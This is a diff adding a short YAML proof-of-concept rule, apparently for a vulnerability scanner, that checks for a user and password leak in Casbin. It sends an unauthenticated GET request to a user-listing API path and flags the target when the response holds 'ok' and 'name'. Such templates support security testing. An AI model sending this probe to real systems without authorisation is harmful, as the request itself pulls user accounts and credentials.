@@ -1,0 +1,13 @@
+name: poc-yaml-poc-yaml-Casbin-userleak
+description: >-
+  用户密码泄露
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: "/api/get-users?p=123&pageSize=123"
+    expression:
+      status: 200
+      body_all:
+        - "ok"
+        - "name"
